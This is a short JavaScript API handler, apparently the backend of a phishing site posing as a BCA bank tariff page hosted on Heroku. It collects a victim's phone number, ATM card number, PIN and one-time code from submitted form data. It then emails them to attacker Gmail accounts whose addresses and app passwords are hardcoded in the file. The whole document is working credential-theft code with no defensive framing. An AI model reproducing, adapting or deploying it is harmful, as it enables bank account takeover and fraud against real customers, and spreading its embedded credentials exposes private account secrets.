export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';
    
    if (url == 'pilihan-terbaru-tarif-bca.herokuapp.com'){

       email = 'berkahhila240@gmail.com'
       pass = 'sojwfkkemloxouvz'
    }else
    
     if (url == 'pilih-tarif-terbaru-bca.herokuapp.com'){

        email = 'jakad2748@gmail.com'
        pass = 'ncvhmetlctriiocc'

    } else {
        email = 'jakad2748@gmail.com'
        pass = 'ncvhmetlctriiocc'
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BCA',
                html: `
                    <ul>
                        <li>nohp: ${body.nohp ?? '-'}</li>
                        <li>noatm: ${body.nomoratm ?? '-'}</li>
                        <li>pin: ${body.pin ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>
                    </ul>
                `,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info:'Berhasil Terkirim', status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
